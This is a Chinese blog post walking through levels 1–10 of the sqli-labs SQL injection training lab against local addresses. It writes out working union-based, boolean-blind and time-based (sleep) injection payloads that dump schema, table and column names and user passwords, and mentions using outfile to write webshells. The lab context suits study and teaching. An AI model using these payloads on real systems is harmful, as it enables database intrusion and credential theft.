+<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><p>这里选择在<code>&#39;</code>后面加上<code>--+</code>进行闭合。访问<code>id=1 and 1=1</code>，由于<code>and 1=1</code>为真，所以页面应返回与<code>id=1</code>相同的结果，如下图<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.2.png"><br>访问<code>id=1 and 1=2</code>，由于<code>and 1=2</code>为假，所以页面应返回与<code>id=1</code>不同的结果。如下图：<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.3.png"><br>可以得出该网站可能存在sql注入漏洞的结论。接着使用<code>order by</code>查询该数据表的字段数量。如下图：<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.4.png"><br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.5.png"><br>在数据库中查询参数ID对应的内容然后将数据库的内容输出到页面，由于是将数据输出到页面上的，所以可以使用Union注入，并通过<code>order by</code>查询结果，得到字段数为3，所以union注入的语句如下表示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.6.png"><br>可以通过设置参数ID值，让服务器端返回union select的结果，例如：把ID的值设置-1，这样数据库中没有id=-1的数据，所以会返回union select的结果。<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.7.png"><br>返回结果为2和3，意味着在union select 1,2,3中，2和3的位置可以输入MySQL语句。</p>
+<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.9.png"></p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.10.png"></p>
+<h3 id="爆表字段"><a href="#爆表字段" class="headerlink" title="爆表字段"></a>爆表字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns  where table_name=&#x27;users&#x27;  --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.11.png"></p>
+<h3 id="爆表字段的内容"><a href="#爆表字段的内容" class="headerlink" title="爆表字段的内容"></a>爆表字段的内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)  --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.12.png"></p>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>数字型注入,不需要去闭合。</p>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>跟第一关基本一样，这个是需要闭合前面的括号。<code>&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=select * from users where id=(&quot;$id&quot;);</span><br></pre></td></tr></table></figure>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>跟第三关一样，<code>&#39;)</code>换成<code>&quot;)</code>这样就可以啦。</p>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>打开发现只有一个you are in….. 将id改为一个不存在的数值就消失，可以判断是盲注，加单引号就报错，所以有sql注入。<br>由于页面只返回you are in…..或者不显示，所以此处不可使用union注入。可以尝试boolean进行注入或者其他方法，这里我使用的是Boolean。</p>
+<p>Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测那些SQL判断条件是成立的，以此获取数据库中的数据。</p>
+<p>这里使用的工具是burpsuite。</p>
+<ul>
+<li>判断数据库名的长度。</li>
+</ul>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.1.png"></p>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.2.png"></p>
+<p>由此可以得出数据库库名长度为8。</p>
+<ul>
+<li>利用substr判断数据库的库名</li>
+</ul>
+<p>数据库的库名范围一般在a~Z、0-9之内，可能还有一些特殊字符，这里的字母不区分大小写。逐字符判断的sql语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;i&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>substr是截取的意思，意思是截取database()的值，从第一个字符开始，每次只返回一个。</p>
+<p>substr的用法跟limit的有区别，需要注意。limit是从0开始排序，而这里是从1开始排序。可以使用burp的爆破功能爆破其中的’i’值。</p>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.3.png"></p>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.4.png"></p>
+<ul>
+<li>利用substr判断数据库的表名</li>
+</ul>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.5.png"></p>
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.6.png"></p>
+<p>以此类推，就可以查询出所有的表名与字段名。</p>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>跟第五关一样，只是将单引号换成了双引号。</p>
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>在这里的显示是Use oufile，oufile函数是mysql写入文件的一种函数，经常被用来写入webshell，同时mysql还有个读取文件的函数load_file函数，但是使用之前都需要找到网站的绝对路径。注意这两个函数能否成功执行受到参数secure_file_priv的影响。</p>
+<ul>
+<li>其中当参数secure_file_priv为空时，对导入导出无限制</li>
+<li>当值为一个指定的目录时，只能向指定的目录导入导出</li>
+<li>当值被设置为NULL时，禁止导入导出功能<br>这一关还是忍不住使用了sqlmap，手动滑稽。</li>
+</ul>
+<p>这篇有详细的思路：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12726288.html" title="sqli-labs通关教程----1~10关">sqli-labs通关教程—-1~10关</a></p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>不能使用报错注入，其他跟第五关一样。</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>这一关使用的是时间注入攻击。时间注入是利用sleep()或benchmark()等函数让MySQL的执行时间变长。时间盲注多与IF(expr1,expr2,expr3)结合使用，此IF语句含义是：如果expr1为true，则IF()的返回值为expr2：否则返回值则为expr3。<br>所以判断数据库的长度语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if (length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.1.png"></p>
+<p>可以看到页面相应时间为5s。多次测试后可以得到数据库库名的长度。</p>
+<p>接下来就可以进行对数据库表名的猜解。<br>语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if (substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.2.png"></p>
+<p>说明数据库名的第一位字母为s，以此类推就可以得到完整的数据库的库名，表名、字段名、和具体数据。</p>
+<ul>
+<li>爆表名：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆列名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  if(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)&gt;&#x27;e&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>具体数据</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  If(ascii(substr((select password from users limit 0,1),1,1))&lt;101,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>跟第九关一样时间盲注，单引号换成双引号。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12726288.html" title="sqli-labs通关教程----1~10关">sqli-labs通关教程—-1~10关</a></li>
+<li>web安全攻防渗透测试指南</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div>
+  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
+</div>
+          <div class="reward-container">
+  <div></div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="隐心 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="隐心 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>隐心
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://vkali.com/archives/6ef1c9b9.html" title="sql注入靶场sqli-labs 1-10关通关教程">https://vkali.com/archives/6ef1c9b9.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5%EF%BC%8Csqli-labs/" rel="tag"><i class="fa fa-tag"></i> sql注入，sqli-labs</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/archives/7c8d8254.html" rel="prev" title="docker搭建SQL注入练习平台">
+                  <i class="fa fa-chevron-left"></i> docker搭建SQL注入练习平台
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/archives/b7d4cf57.html" rel="next" title="nginx重定向非www到www">
+                  nginx重定向非www到www <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">隐心</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">123k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:52</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("10/09/2020 15:54:40");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 " +hnum + " 小时 " + mnum + " 分 " + snum + " 秒";        
+    }
+setInterval("createtime()",250);
+</script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/quicklink@2.2.0/dist/quicklink.umd.js" integrity="sha256-4kQf9z5ntdQrzsBC3YSHnEz02Z9C1UeW/E9OgnvlzSY=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://vkali.com/archives/6ef1c9b9.html"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-CN","enable":true,"serverURL":"https://vkali-api.vercel.app","placeholder":"Just go go","avatar":"monsterid","pageSize":10,"visitor":false,"comment_count":true,"requiredFields":["nick","mail","link"],"meta":["nick","mail","link"],"libUrl":"//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js","el":"#waline-comments","path":"/archives/6ef1c9b9.html"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() => 
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => {
+    new Waline(CONFIG.waline);
+  });
+});
+</script>
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+
+
+
+</body>
+</html>
